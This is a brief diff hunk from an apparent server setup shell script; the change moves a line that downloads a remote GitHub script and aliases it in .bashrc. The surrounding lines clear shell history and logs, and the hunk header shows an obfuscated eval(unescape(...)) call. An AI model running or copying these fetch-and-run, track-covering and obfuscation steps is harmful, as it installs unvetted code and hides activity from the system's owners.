@@ -107,7 +107,7 @@ eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6d%38%36%36%31%32%3
 history -c
 clear
 /etc/init.d/apache2 restart
-cd && wget "https://raw.githubusercontent.com/3rd48/thirdy/main/create.sh" -O thirdy-create-user.sh && echo "alias create='bash thirdy-create-user.sh'" >> .bashrc && source .bashrc
 rm -f wget-log*
 rm -f gtm2.sh*
+cd && wget "https://raw.githubusercontent.com/3rd48/thirdy/main/create.sh" -O thirdy-create-user.sh && echo "alias create='bash thirdy-create-user.sh'" >> .bashrc && source .bashrc
 reboot 1*
